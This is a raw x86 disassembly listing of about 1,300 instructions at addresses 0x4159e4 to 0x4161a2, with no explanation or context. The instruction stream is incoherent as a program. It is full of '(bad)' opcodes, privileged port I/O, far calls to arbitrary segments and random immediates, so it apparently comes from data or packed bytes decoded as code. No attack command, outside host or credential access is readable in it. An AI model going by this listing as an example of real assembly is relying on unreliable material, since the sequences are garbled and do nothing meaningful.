  4159e4:	mov    ebp,0x577ff73e
  4159e9:	call   0xecc6:0xdb156300
  4159f0:	xchg   ecx,eax
  4159f1:	push   ecx
  4159f2:	cdq    
  4159f3:	out    0xe8,eax
  4159f5:	dec    ecx
  4159f6:	shl    DWORD PTR [ebp-0x4e],0x67
  4159fa:	mov    BYTE PTR [esp+ebp*8+0x691a0583],cl
  415a01:	fistp  DWORD PTR [esi-0x54]
  415a04:	call   0xf892c22a
  415a09:	sub    al,0xcf
  415a0b:	test   al,0x16
  415a0d:	xlat   BYTE PTR ds:[ebx]
  415a0e:	sub    eax,0xa6188506
  415a13:	mov    ebp,DWORD PTR [ebx+0xd]
  415a16:	imul   ebp,DWORD PTR [esi],0xffffffc3
  415a19:	stos   DWORD PTR es:[edi],eax
  415a1a:	xchg   esp,eax
  415a1b:	cs retf 0x702e
  415a1f:	out    dx,al
  415a20:	sbb    DWORD PTR [ebp+ebp*1+0x59],ecx
  415a24:	add    al,0xe7
  415a26:	(bad)  
  415a27:	lds    esi,FWORD PTR [ebp-0x1a]
  415a2a:	mov    db7,esi
  415a2d:	mov    bh,0x46
  415a2f:	sub    BYTE PTR [ecx+0x490995dd],al
  415a35:	xchg   ebp,eax
  415a36:	out    dx,eax
  415a37:	stos   BYTE PTR es:[edi],al
  415a38:	outs   dx,BYTE PTR ds:[esi]
  415a39:	pushw  0x10
  415a3c:	test   BYTE PTR [eax+0x69d7665a],ah
  415a42:	out    0x3e,al
  415a44:	jno    0x4159ec
  415a46:	fsubr  DWORD PTR ds:0x1917ce29
  415a4c:	stc    
  415a4d:	adc    BYTE PTR [esi],ch
  415a4f:	inc    esp
  415a50:	pop    esp
  415a51:	gs rcr ebx,0x70
  415a55:	rcl    DWORD PTR [ecx+0x77b3fff2],1
  415a5b:	aad    0xc1
  415a5d:	dec    ebp
  415a5e:	sub    edi,DWORD PTR [ebx+0x37a8c0c3]
  415a64:	dec    esi
  415a65:	sbb    bh,BYTE PTR [ebp+0x25e251f6]
  415a6b:	ret    
  415a6c:	add    BYTE PTR [ebx],0x6b
  415a6f:	add    DWORD PTR [eax-0x3cd070e4],edx
  415a75:	cmc    
  415a76:	ds (bad) 
  415a78:	jmp    0x7af5:0x31613fea
  415a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a80:	das    
  415a81:	push   eax
  415a82:	(bad)  
  415a83:	fmul   st,st(7)
  415a85:	scas   al,BYTE PTR es:[edi]
  415a86:	test   DWORD PTR [edi],esp
  415a88:	nop
  415a89:	push   ebp
  415a8a:	into   
  415a8b:	or     al,0xac
  415a8d:	add    bl,BYTE PTR [edx+eiz*1-0x52]
  415a91:	jl     0x415aee
  415a93:	in     al,0x2f
  415a95:	data16 icebp 
  415a97:	pop    ecx
  415a98:	jle    0x415acd
  415a9a:	out    dx,eax
  415a9b:	idiv   BYTE PTR [edx+eiz*1]
  415a9e:	sub    BYTE PTR [ecx-0x70],dh
  415aa1:	inc    ebp
  415aa2:	add    BYTE PTR ds:0xb7529f1f,cl
  415aa8:	in     eax,dx
  415aa9:	and    al,BYTE PTR [ecx]
  415aab:	xchg   esp,eax
  415aac:	or     ecx,DWORD PTR [ebp+0x53]
  415aaf:	stc    
  415ab0:	imul   DWORD PTR [ebp+0x1f24c869]
  415ab6:	stos   BYTE PTR es:[edi],al
  415ab7:	leave  
  415ab8:	push   ecx
  415ab9:	cmp    DWORD PTR [ebx],ebx
  415abb:	sbb    ecx,ecx
  415abd:	sub    eax,0xe1728cf1
  415ac2:	adc    BYTE PTR [edi+0x1afaf23b],ah
  415ac8:	mov    edx,0xe3a9e7bd
  415acd:	xor    eax,0x57a71f6a
  415ad2:	ror    esp,1
  415ad4:	icebp  
  415ad5:	inc    edx
  415ad6:	arpl   WORD PTR [ebp+ecx*2+0x1a6dad19],di
  415add:	lds    eax,FWORD PTR [edx-0x32]
  415ae0:	jg     0x415a9b
  415ae2:	fcmovnb st,st(3)
  415ae4:	pop    eax
  415ae5:	inc    edi
  415ae6:	mov    BYTE PTR [ebx+edx*2+0x13],0xff
  415aeb:	lahf   
  415aec:	mov    ebx,0xe01535de
  415af1:	ja     0x415b35
  415af3:	push   ecx
  415af4:	leave  
  415af5:	mov    ecx,0x2e1508d1
  415afa:	add    al,0xd
  415afc:	mov    esp,0xb9960b2a
  415b01:	or     DWORD PTR [edx],edx
  415b03:	loop   0x415b13
  415b05:	mov    al,0xc7
  415b07:	cmp    ecx,DWORD PTR [esi]
  415b09:	(bad)  
  415b0a:	sar    BYTE PTR [ebx+0x4522f551],0x74
  415b11:	inc    esp
  415b12:	ds mov ebx,0xde5f1f99
  415b18:	arpl   WORD PTR [edi],sp
  415b1a:	jno    0x415b75
  415b1c:	ja     0x415b3a
  415b1e:	cwde   
  415b1f:	lock jno 0x415b3f
  415b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b23:	loop   0x415aba
  415b25:	cmp    BYTE PTR [ecx+0x40240e8c],ah
  415b2b:	lods   eax,DWORD PTR ds:[esi]
  415b2c:	lods   al,BYTE PTR ds:[esi]
  415b2d:	jp     0x415ad2
  415b2f:	xor    BYTE PTR [ebp+0x25631678],dl
  415b35:	std    
  415b36:	mov    ebx,0xb93e777b
  415b3b:	xchg   edx,eax
  415b3c:	imul   ebx,edi,0x4f
  415b3f:	cdq    
  415b40:	cdq    
  415b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b42:	stos   BYTE PTR es:[edi],al
  415b43:	adc    esi,DWORD PTR [esi-0x17]
  415b46:	cmp    eax,0xe98d978b
  415b4b:	push   esp
  415b4c:	pop    ds
  415b4d:	pop    es
  415b4e:	xchg   ebx,edx
  415b50:	cs adc esp,ebp
  415b53:	jno    0x415ae0
  415b55:	adc    dl,ch
  415b57:	xchg   edx,eax
  415b58:	jmp    0xccacd0c8
  415b5d:	fstp   QWORD PTR [esi]
  415b5f:	mov    ebx,gs
  415b61:	bound  ebx,QWORD PTR [ecx]
  415b63:	aas    
  415b64:	push   esp
  415b65:	push   ebp
  415b66:	xchg   esp,eax
  415b67:	daa    
  415b68:	loop   0x415b8f
  415b6a:	xor    DWORD PTR [eax+ebp*1],esi
  415b6d:	jp     0x415b62
  415b6f:	add    esi,ebx
  415b71:	xor    dl,dl
  415b73:	fwait
  415b74:	mov    bh,BYTE PTR [ebx-0x903c96]
  415b7a:	xor    eax,ebx
  415b7c:	cs es aad 0xed
  415b80:	shr    ah,0x77
  415b83:	sub    ebx,DWORD PTR [esi+0xe80bbee]
  415b89:	xchg   ecx,eax
  415b8a:	ror    BYTE PTR [ecx+0x65],0x93
  415b8e:	adc    dh,BYTE PTR [ebp+0x4d087c3]
  415b94:	adc    al,0x5a
  415b96:	bound  ebp,QWORD PTR [ebx+0x62db8cca]
  415b9c:	add    bl,BYTE PTR [ebp+0x2d]
  415b9f:	mov    dh,0x43
  415ba1:	and    BYTE PTR [edx],0xbe
  415ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba5:	leave  
  415ba6:	cmp    dh,BYTE PTR [eax]
  415ba8:	xchg   DWORD PTR [esi-0x19],eax
  415bab:	or     eax,0xc156cb0c
  415bb0:	sub    eax,0xd02ca0e0
  415bb5:	mov    al,0x48
  415bb7:	in     al,dx
  415bb8:	add    DWORD PTR [edi],edi
  415bba:	mov    dl,0x48
  415bbc:	sub    al,0xbb
  415bbe:	jne    0x415bdc
  415bc0:	les    esi,FWORD PTR [edx+0x4d2a7778]
  415bc6:	outs   dx,DWORD PTR ds:[esi]
  415bc7:	test   BYTE PTR [ecx],bl
  415bc9:	outs   dx,DWORD PTR ds:[esi]
  415bca:	mov    ebx,DWORD PTR [edi]
  415bcc:	pop    es
  415bcd:	bound  ebx,QWORD PTR [esp+edi*2-0x7438556f]
  415bd4:	sbb    cl,BYTE PTR [esi+0x145d26de]
  415bda:	xor    dh,bh
  415bdc:	inc    edx
  415bdd:	push   edi
  415bde:	inc    eax
  415bdf:	cs sbb eax,0x9790df1d
  415be5:	adc    al,0xf0
  415be7:	jne    0x415b9b
  415be9:	dec    ebp
  415bea:	or     al,0x6e
  415bec:	dec    esi
  415bed:	jg     0x415c48
  415bef:	ds sahf 
  415bf1:	add    al,0xc
  415bf3:	pop    esp
  415bf4:	dec    eax
  415bf5:	(bad)  
  415bf6:	add    esp,DWORD PTR [eax]
  415bf8:	pop    ebx
  415bf9:	cs daa 
  415bfb:	and    DWORD PTR [esi+0x739874c4],0x1a4e90e
  415c05:	imul   BYTE PTR [ebx+edx*2]
  415c08:	ret    
  415c09:	adc    BYTE PTR [ebx-0x4d],dh
  415c0c:	xor    eax,0x37dd3a2c
  415c11:	cmp    ch,BYTE PTR [ebp+0x41b37ff9]
  415c17:	retf   0x951f
  415c1a:	not    DWORD PTR [esi-0x79128ff6]
  415c20:	mov    dl,0x7f
  415c22:	xlat   BYTE PTR ds:[ebx]
  415c23:	jecxz  0x415c8b
  415c25:	mov    ds:0x485c21bc,al
  415c2a:	pop    ecx
  415c2b:	das    
  415c2c:	mov    ds:0x9289d325,eax
  415c31:	dec    esi
  415c32:	lock jb 0x415ca8
  415c35:	cld    
  415c36:	adc    eax,0xde9538ec
  415c3b:	jbe    0x415bf6
  415c3d:	push   ebx
  415c3e:	jecxz  0x415be5
  415c40:	inc    ebp
  415c41:	or     al,0x82
  415c43:	pop    ebp
  415c44:	ret    
  415c45:	push   0xffffffe5
  415c47:	(bad)  
  415c48:	add    DWORD PTR gs:[ebx+0x55],esi
  415c4c:	push   edi
  415c4d:	pop    ebx
  415c4e:	push   ebx
  415c4f:	sub    al,0xc7
  415c51:	inc    edx
  415c52:	(bad)  
  415c53:	adc    al,0x5e
  415c55:	push   ebx
  415c56:	dec    esp
  415c57:	inc    esp
  415c58:	dec    edi
  415c59:	aaa    
  415c5a:	push   esp
  415c5b:	arpl   bp,bp
  415c5d:	stos   DWORD PTR es:[edi],eax
  415c5e:	retf   
  415c5f:	mov    esp,0x2870a107
  415c64:	int3   
  415c65:	das    
  415c66:	out    0x9e,eax
  415c68:	rol    DWORD PTR [ebp+0x7a],1
  415c6b:	sbb    BYTE PTR ds:0x6f11c76e,ah
  415c71:	fadd   st(7),st
  415c73:	pushf  
  415c74:	mov    bh,0xd2
  415c76:	and    edi,DWORD PTR [ecx+edi*1]
  415c79:	push   0x29bed2f
  415c7e:	cmp    dl,BYTE PTR [esi-0x67]
  415c81:	call   0xcd1:0x6301aae1
  415c88:	xlat   BYTE PTR ds:[ebx]
  415c89:	out    0x86,eax
  415c8b:	inc    eax
  415c8c:	mov    eax,ds:0xd0497c0f
  415c91:	pop    edi
  415c92:	or     DWORD PTR [edx+0x33791747],edx
  415c98:	fdivr  QWORD PTR [ecx-0x5c]
  415c9b:	mov    ah,0x42
  415c9d:	clc    
  415c9e:	and    eax,0x1d8184f
  415ca3:	pushf  
  415ca4:	lds    eax,FWORD PTR [ecx+0x55a4211b]
  415caa:	and    eax,0xa1fbc0b5
  415caf:	pop    ds
  415cb0:	add    BYTE PTR [ebp+0x49],cl
  415cb3:	test   eax,0x8cd27134
  415cb8:	mov    esp,0x8d7adc39
  415cbd:	mov    ch,dl
  415cbf:	fidivr DWORD PTR [ecx-0x34]
  415cc2:	pusha  
  415cc3:	push   edi
  415cc4:	int    0x68
  415cc6:	inc    esp
  415cc7:	xchg   esi,eax
  415cc8:	sub    esi,DWORD PTR [edi-0x83c8d4]
  415cce:	test   BYTE PTR [esi-0x373ee4cc],dl
  415cd4:	mov    edx,0x83ef427e
  415cd9:	sub    edi,ebp
  415cdb:	ret    0x93d1
  415cde:	jo     0x415ce5
  415ce0:	cld    
  415ce1:	dec    esp
  415ce2:	and    DWORD PTR [edi],edx
  415ce4:	jg     0x415cbb
  415ce6:	sub    al,0x45
  415ce8:	sbb    dl,BYTE PTR [eax+0x71a76bcc]
  415cee:	and    ah,BYTE PTR [ecx]
  415cf0:	(bad)  [eax+0x5e]
  415cf3:	xchg   DWORD PTR [ecx+0x1c8aa8bc],edi
  415cf9:	dec    eax
  415cfa:	imul   edx,esp,0xebb22494
  415d00:	jb     0x415d34
  415d02:	xchg   edi,eax
  415d03:	mov    eax,ds:0x15080e68
  415d08:	stos   BYTE PTR es:[edi],al
  415d09:	sub    eax,0xc955176f
  415d0e:	mov    edx,0x32e89299
  415d13:	mov    dl,0x0
  415d15:	cmp    ebx,edx
  415d17:	push   0x18
  415d19:	add    BYTE PTR [ebp+0x24],bl
  415d1c:	retf   0xa85a
  415d1f:	loop   0x415cab
  415d21:	das    
  415d22:	out    dx,al
  415d23:	stc    
  415d24:	cld    
  415d25:	(bad)  
  415d26:	and    dh,BYTE PTR [edx+0x5656f598]
  415d2c:	mul    dh
  415d2e:	sbb    al,0xd2
  415d30:	fwait
  415d31:	pop    es
  415d32:	mov    ebx,0x3c02ffd1
  415d37:	mov    esi,0x4078e476
  415d3c:	lea    edx,[edi+0x38ab4b8b]
  415d42:	(bad)  
  415d44:	mov    ch,0x8f
  415d46:	int    0xd0
  415d48:	shl    BYTE PTR [eax-0xaa958c9],1
  415d4e:	in     eax,0xba
  415d50:	inc    esp
  415d51:	stc    
  415d52:	jae    0x415ce7
  415d54:	xchg   BYTE PTR [esi],cl
  415d56:	mov    ah,0x54
  415d58:	nop
  415d59:	dec    ebp
  415d5a:	cwde   
  415d5b:	or     al,0xa9
  415d5d:	popa   
  415d5e:	loopne 0x415d7d
  415d60:	mov    ds:0x2e1fcda4,al
  415d65:	cmp    DWORD PTR [esp+edx*8],edi
  415d68:	lock xor DWORD PTR [ecx-0x5f4a3121],edx
  415d6f:	and    BYTE PTR [eax+0x75],bh
  415d72:	pop    ebp
  415d73:	ins    BYTE PTR es:[edi],dx
  415d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d75:	mov    eax,DWORD PTR [ebp+0x6]
  415d78:	ror    BYTE PTR [edi+0x2],0x5e
  415d7c:	xor    DWORD PTR [esi-0x58],0x91fbe89f
  415d83:	cmp    eax,0x5e00faa5
  415d88:	sbb    al,cl
  415d8a:	cmp    al,0xb1
  415d8c:	fwait
  415d8d:	xchg   edi,eax
  415d8e:	(bad)  
  415d8f:	aad    0x1d
  415d91:	inc    dh
  415d93:	cmp    esi,DWORD PTR [ebp+edi*2-0x2]
  415d97:	clc    
  415d98:	inc    eax
  415d99:	das    
  415d9a:	mov    eax,ss
  415d9c:	inc    ebx
  415d9d:	mov    esi,DWORD PTR [edi-0x13c13ca9]
  415da3:	sbb    dl,BYTE PTR [edx-0x17bc0b0e]
  415da9:	ret    0x10a9
  415dac:	idiv   BYTE PTR [esi+ecx*4]
  415daf:	imul   esp,DWORD PTR [eax],0xa36717bb
  415db5:	fisub  WORD PTR [ecx+0x53ae9b8a]
  415dbb:	mov    eax,0xb4c138a
  415dc0:	popf   
  415dc1:	fst    QWORD PTR [esi-0x46525666]
  415dc7:	sar    ecx,1
  415dc9:	dec    esp
  415dca:	stos   DWORD PTR es:[edi],eax
  415dcb:	out    0x74,al
  415dcd:	in     eax,0x3d
  415dcf:	popf   
  415dd0:	lea    di,[ebx-0x2f]
  415dd4:	outs   dx,BYTE PTR ds:[esi]
  415dd5:	lods   eax,DWORD PTR ds:[esi]
  415dd6:	pop    es
  415dd7:	fs sub al,0x30
  415dda:	pushf  
  415ddb:	daa    
  415ddc:	xchg   esi,eax
  415ddd:	adc    ebp,DWORD PTR ds:0xb57580b2
  415de3:	mov    ah,BYTE PTR [ebx+0x22]
  415de6:	idiv   BYTE PTR [ecx-0x71]
  415de9:	xchg   ebx,eax
  415dea:	xor    cl,al
  415dec:	add    eax,0x5aae5c86
  415df1:	sbb    DWORD PTR [ebx-0x6a],ebp
  415df4:	fiadd  DWORD PTR [esp+eax*2]
  415df7:	cmp    DWORD PTR [esi],0xffffffd5
  415dfa:	inc    di
  415dfc:	jne    0x415dd8
  415dfe:	imul   esp,DWORD PTR [esi],0x3f
  415e01:	mov    al,0xf3
  415e03:	inc    esi
  415e04:	fstp   QWORD PTR [eax-0x287fba58]
  415e0a:	cmp    dl,BYTE PTR [edi-0x208f5225]
  415e10:	ret    0x3200
  415e13:	mov    ch,0xfb
  415e15:	adc    eax,0xffd412b6
  415e1a:	jecxz  0x415e3a
  415e1c:	mov    ds:0xa6263e50,eax
  415e21:	bound  esp,QWORD PTR gs:[edx-0x321e33eb]
  415e28:	ds sub bl,bl
  415e2b:	lahf   
  415e2c:	inc    ecx
  415e2d:	rcr    ah,1
  415e2f:	shr    DWORD PTR [ecx+eax*4+0x50],0x8
  415e34:	pushf  
  415e35:	add    dl,0xe7
  415e38:	mov    eax,cs:0x45badcf0
  415e3e:	cs or  eax,0xb919ed5f
  415e44:	mov    dh,0x89
  415e46:	push   edx
  415e47:	mov    ch,0x6f
  415e49:	movsx  esi,BYTE PTR [edx+edx*4+0x738ae27d]
  415e51:	(bad)  
  415e52:	sbb    eax,0x470a5410
  415e57:	cdq    
  415e58:	cwde   
  415e59:	call   DWORD PTR [ebx-0x75]
  415e5c:	leave  
  415e5d:	inc    ebx
  415e5e:	xchg   edx,eax
  415e5f:	mov    ah,0x83
  415e61:	mov    ch,0x73
  415e63:	es mov dl,0x6c
  415e66:	sub    DWORD PTR [esi],0xffffffe6
  415e69:	fiadd  DWORD PTR [edi]
  415e6b:	mov    cl,0x39
  415e6d:	fsub   QWORD PTR [eax-0x4d6cd6ea]
  415e73:	inc    edi
  415e74:	ret    0x38d8
  415e77:	imul   esi,DWORD PTR [edi-0x215820e8],0xc6feda16
  415e81:	mov    ch,BYTE PTR [esi+0x7b932107]
  415e87:	sbb    eax,0x452e93de
  415e8c:	loope  0x415e89
  415e8e:	iret   
  415e8f:	xor    BYTE PTR [eax],dh
  415e91:	dec    ebx
  415e92:	push   eax
  415e93:	xor    eax,eax
  415e95:	xor    al,0xe6
  415e97:	xchg   ecx,eax
  415e98:	enter  0x54c7,0xe5
  415e9c:	adc    al,0x35
  415e9e:	add    edx,ebp
  415ea0:	out    dx,eax
  415ea1:	addr16 ret 
  415ea3:	add    BYTE PTR [ecx-0x4e8fcf2b],dl
  415ea9:	lds    ecx,FWORD PTR [edx+ebp*2-0x7a36200d]
  415eb0:	test   al,0x26
  415eb2:	ror    BYTE PTR [ebp+0x4a],1
  415eb5:	xchg   edi,eax
  415eb6:	and    DWORD PTR [edi],ebp
  415eb8:	fwait
  415eb9:	adc    al,0x4a
  415ebb:	cmp    BYTE PTR [edx],0x46
  415ebe:	into   
  415ebf:	hlt    
  415ec0:	pop    ss
  415ec1:	jl     0x415ed8
  415ec3:	xor    ebp,DWORD PTR [esi]
  415ec5:	aas    
  415ec6:	add    eax,0x90744926
  415ecb:	or     esi,DWORD PTR [ebx-0x20]
  415ece:	(bad)  
  415ecf:	out    0x4b,eax
  415ed1:	js     0x415f13
  415ed3:	aad    0xff
  415ed5:	dec    dl
  415ed7:	test   DWORD PTR [ebx+0x27],ebx
  415eda:	jle    0x415f42
  415edc:	call   0xf6a2:0x44ad976
  415ee3:	mov    al,ds:0x196f3467
  415ee8:	mov    cl,ch
  415eea:	mov    edx,0x89c3b4f6
  415eef:	adc    esp,ebp
  415ef1:	mov    eax,0x93577050
  415ef6:	(bad)  
  415ef8:	lods   al,BYTE PTR ds:[esi]
  415ef9:	sub    eax,0x25c2dd08
  415efe:	out    0xe0,al
  415f00:	jecxz  0x415f57
  415f02:	fwait
  415f03:	enter  0xe5dc,0xcf
  415f07:	push   ebx
  415f08:	mov    ds:0x45f9e4e1,eax
  415f0d:	mov    eax,0xb87a93bb
  415f12:	pop    edx
  415f13:	xchg   BYTE PTR [ebx+0x7914a8a3],ch
  415f19:	fnsave [edx+0x7c8906e4]
  415f1f:	xchg   DWORD PTR [esi+0x13],esi
  415f22:	cli    
  415f23:	mov    esi,gs
  415f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f26:	xchg   esp,eax
  415f27:	mov    cl,0x0
  415f29:	dec    edi
  415f2a:	add    ebx,ebp
  415f2c:	into   
  415f2d:	mov    edi,0x65de6f8d
  415f32:	inc    edx
  415f33:	fimul  DWORD PTR [ecx]
  415f35:	popa   
  415f36:	shr    DWORD PTR [ecx+0x49e61287],0xe
  415f3d:	in     al,0x99
  415f3f:	dec    esi
  415f40:	stc    
  415f41:	sahf   
  415f42:	and    eax,0xef97c2b8
  415f47:	(bad)  
  415f48:	in     eax,0x4c
  415f4a:	push   ebp
  415f4b:	lods   eax,DWORD PTR ds:[esi]
  415f4c:	pop    ebx
  415f4d:	push   ebp
  415f4e:	mov    edi,0xa7d0a2c3
  415f53:	int    0x85
  415f55:	xor    DWORD PTR [eax],edi
  415f57:	lock ja 0x415f8a
  415f5a:	stos   DWORD PTR es:[edi],eax
  415f5b:	lods   eax,DWORD PTR ds:[esi]
  415f5c:	daa    
  415f5d:	mov    DWORD PTR [edx+0x5b4723a8],ecx
  415f63:	cmp    esi,ecx
  415f65:	xor    bh,dh
  415f67:	outs   dx,BYTE PTR ds:[esi]
  415f68:	pop    eax
  415f69:	je     0x415fe0
  415f6b:	pop    es
  415f6c:	xor    al,0x2
  415f6e:	es pushf 
  415f70:	enter  0x743c,0x15
  415f74:	and    BYTE PTR [eax],bl
  415f76:	jnp    0x415fb7
  415f78:	xor    ebx,DWORD PTR [ebx-0x6f]
  415f7b:	jge    0x415f26
  415f7d:	loopne 0x415f2d
  415f7f:	in     al,0x9c
  415f81:	sub    BYTE PTR [ecx+edi*2+0x148360cc],dh
  415f88:	aaa    
  415f89:	(bad)  
  415f8b:	xor    ebp,DWORD PTR [esi+0x7]
  415f8e:	das    
  415f8f:	iret   
  415f90:	ret    0x9b84
  415f93:	xchg   esi,eax
  415f94:	sbb    ebx,0xffffffee
  415f97:	ss push esp
  415f99:	pavgb  mm0,QWORD PTR [edx+0xfa8e32b]
  415fa0:	dec    edi
  415fa1:	(bad)  
  415fa2:	dec    BYTE PTR [esi]
  415fa4:	dec    esp
  415fa5:	dec    eax
  415fa6:	pop    esp
  415fa7:	mov    ebp,DWORD PTR [ecx-0x21df7b43]
  415fad:	cwde   
  415fae:	es sub al,0x13
  415fb1:	je     0x415f8a
  415fb3:	sbb    ch,BYTE PTR [ecx-0x2a]
  415fb6:	jl     0x415f81
  415fb8:	clc    
  415fb9:	jno    0x415f5c
  415fbb:	ss inc edx
  415fbd:	mov    edx,0xe53bb966
  415fc2:	cmp    eax,DWORD PTR [eax-0x36]
  415fc5:	pop    ebp
  415fc6:	into   
  415fc7:	retf   0x16a6
  415fca:	push   ds
  415fcb:	jle    0x415fcd
  415fcd:	shl    esp,cl
  415fcf:	dec    edi
  415fd0:	sub    cl,BYTE PTR [edx-0x73]
  415fd3:	popa   
  415fd4:	test   DWORD PTR [esi+0x35db78bf],edi
  415fda:	inc    eax
  415fdb:	mov    ebx,0xaf1ced57
  415fe0:	jb     0x41605e
  415fe2:	test   bl,dl
  415fe4:	xchg   ecx,eax
  415fe5:	jne    0x415fe3
  415fe7:	push   edx
  415fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fe9:	and    dl,dh
  415feb:	cmp    eax,DWORD PTR [ebx+0x38]
  415fee:	test   BYTE PTR [edi],dl
  415ff0:	ja     0x416069
  415ff2:	dec    ebp
  415ff3:	bound  ebp,QWORD PTR [ebx+0x38]
  415ff6:	sub    eax,0x5ee124e8
  415ffb:	push   esi
  415ffc:	fidivr WORD PTR [edx]
  415ffe:	je     0x41604f
  416000:	push   esi
  416001:	(bad)  
  416002:	das    
  416003:	jns    0x416076
  416005:	xchg   ebx,eax
  416006:	and    esp,ecx
  416008:	sub    BYTE PTR [esi],ah
  41600a:	mov    al,0x52
  41600c:	(bad)  
  41600d:	mov    DWORD PTR [ebp+0x4a],esp
  416010:	in     eax,dx
  416011:	push   cx
  416013:	imul   ecx,DWORD PTR [edi],0x67f0e12d
  416019:	add    cl,BYTE PTR [esi]
  41601b:	mov    BYTE PTR [esp+esi*4],al
  41601e:	(bad)  
  41601f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416020:	into   
  416021:	mov    al,0x1f
  416023:	inc    esi
  416024:	push   es
  416025:	out    0x43,al
  416027:	dec    ecx
  416028:	xchg   edx,eax
  416029:	xchg   ecx,eax
  41602a:	pop    edi
  41602b:	xchg   esi,eax
  41602c:	push   ss
  41602d:	jmp    0x6d996b2f
  416032:	sbb    eax,0xacd65f48
  416037:	mov    al,ds:0x9305c9d6
  41603c:	arpl   WORD PTR [ecx],di
  41603e:	ror    DWORD PTR [esi],cl
  416040:	sbb    DWORD PTR [esi+0x65],ecx
  416043:	ja     0x416074
  416045:	push   ebp
  416046:	ret    
  416047:	fadd   QWORD PTR [eax+0x514788eb]
  41604d:	nop
  41604e:	sbb    al,0xf1
  416050:	jmp    0x4160cc
  416052:	dec    ebp
  416053:	leave  
  416054:	scas   eax,DWORD PTR es:[edi]
  416055:	call   0x3962b94
  41605a:	pop    ecx
  41605b:	test   eax,0xf23db5a2
  416060:	pop    edx
  416061:	(bad)  
  416062:	mov    eax,0x307b989b
  416067:	fsub   st,st(1)
  416069:	mov    ecx,0xf2f99226
  41606e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41606f:	cmp    al,0x69
  416071:	ficomp WORD PTR [edx+0x283d4f15]
  416077:	dec    edi
  416078:	xor    DWORD PTR [eax],ebx
  41607a:	jae    0x41600f
  41607c:	std    
  41607d:	popf   
  41607e:	stc    
  41607f:	jno    0x416010
  416081:	or     al,0xab
  416083:	pop    edi
  416084:	not    BYTE PTR [ecx+0x4c]
  416087:	or     eax,0x698f0b90
  41608c:	dec    edi
  41608d:	mov    WORD PTR [esi+ebx*1-0x3f18f06],cs
  416094:	(bad)  
  416095:	cmp    BYTE PTR [edi],0x9d
  416098:	xlat   BYTE PTR ds:[ebx]
  41609a:	call   0xd694:0x9fc50de8
  4160a1:	das    
  4160a2:	xor    edi,ecx
  4160a4:	dec    ebp
  4160a5:	pushf  
  4160a6:	or     eax,0x833629f
  4160ab:	and    eax,0x8f3b9ca2
  4160b0:	add    al,0xf7
  4160b2:	mov    ebp,0x2d4027d
  4160b7:	ss cmp al,0xb4
  4160ba:	push   gs
  4160bc:	mov    edi,0x29c298a5
  4160c1:	sbb    BYTE PTR [esi],0xd4
  4160c4:	cs xor dh,0x20
  4160c8:	inc    eax
  4160c9:	fisub  DWORD PTR [edx+0x78]
  4160cc:	sub    BYTE PTR [esp+edx*4+0x4e71c068],al
  4160d3:	ror    BYTE PTR [ebp+0x41],1
  4160d6:	pop    es
  4160d7:	gs popa 
  4160d9:	das    
  4160da:	push   ds
  4160db:	test   DWORD PTR [ecx],esp
  4160dd:	mov    eax,ds:0x4f21bf31
  4160e2:	enter  0xc6e6,0xdf
  4160e6:	sbb    dh,BYTE PTR [esi]
  4160e8:	mov    eax,ds:0xe92e3aa5
  4160ed:	cmp    edi,DWORD PTR [edi]
  4160ef:	jbe    0x416091
  4160f1:	cmp    ebp,edx
  4160f3:	scas   al,BYTE PTR es:[edi]
  4160f4:	popa   
  4160f5:	inc    ebx
  4160f6:	(bad)  
  4160f7:	jo     0x416105
  4160f9:	cmp    al,cl
  4160fb:	mov    dl,0x0
  4160fd:	cmp    ebx,edx
  4160ff:	in     al,0x6c
  416101:	outs   dx,DWORD PTR ds:[esi]
  416102:	or     eax,0x1f95fedf
  416107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416108:	sub    ah,0xcd
  41610b:	push   0x24
  41610d:	aad    0xed
  41610f:	ins    BYTE PTR es:[edi],dx
  416110:	pop    es
  416111:	test   eax,0xc3e4aad2
  416116:	gs cmp al,0x28
  416119:	out    dx,eax
  41611a:	std    
  41611b:	dec    esp
  41611c:	inc    edi
  41611d:	popa   
  41611e:	pop    eax
  41611f:	outs   dx,DWORD PTR ds:[esi]
  416120:	adc    edi,DWORD PTR [eax-0x57]
  416123:	mov    al,0x19
  416125:	pop    ecx
  416126:	mov    ch,0x2
  416128:	scas   eax,DWORD PTR es:[edi]
  416129:	xchg   esi,eax
  41612a:	adc    eax,edi
  41612c:	pop    ds
  41612d:	sub    BYTE PTR [ecx-0x37],dh
  416130:	adc    eax,0xfdec225
  416135:	clc    
  416136:	push   ebx
  416137:	sub    BYTE PTR [esi+0x2af345a2],dl
  41613d:	nop
  41613e:	inc    edi
  41613f:	push   0x8f6ccc0a
  416144:	shr    DWORD PTR [eax+edx*1],cl
  416147:	sub    ebp,DWORD PTR [eax-0x50]
  41614a:	dec    ecx
  41614b:	xor    al,0x86
  41614d:	aas    
  41614e:	int3   
  41614f:	rcl    BYTE PTR [ecx-0x1a406b89],1
  416155:	inc    edi
  416156:	jmp    0xcfbf0151
  41615b:	sti    
  41615c:	shr    DWORD PTR [ebp+0x3152dd32],cl
  416162:	jg     0x41618b
  416164:	fs jl  0x416105
  416167:	jge    0x416176
  416169:	das    
  41616a:	xchg   ecx,eax
  41616b:	push   ds
  41616c:	sahf   
  41616d:	mov    ch,0x60
  41616f:	into   
  416170:	cli    
  416171:	(bad)  
  416172:	div    BYTE PTR [ebx+ecx*4]
  416175:	push   edx
  416176:	pop    es
  416177:	call   0x875b97a6
  41617c:	mov    ss,edi
  41617e:	mov    esp,0x8325b240
  416183:	fld    TBYTE PTR [esi-0x2dd9fdc5]
  416189:	into   
  41618a:	xor    BYTE PTR ss:[ebp-0x23],bl
  41618e:	sar    BYTE PTR [eax+edi*1-0x1721c241],0x30
  416196:	bound  ebp,QWORD PTR [ebp+0x50e32870]
  41619c:	xor    ah,al
  41619e:	sbb    edi,DWORD PTR [eax]
  4161a0:	(bad)  
  4161a2:	fistp  QWORD PTR [edi]
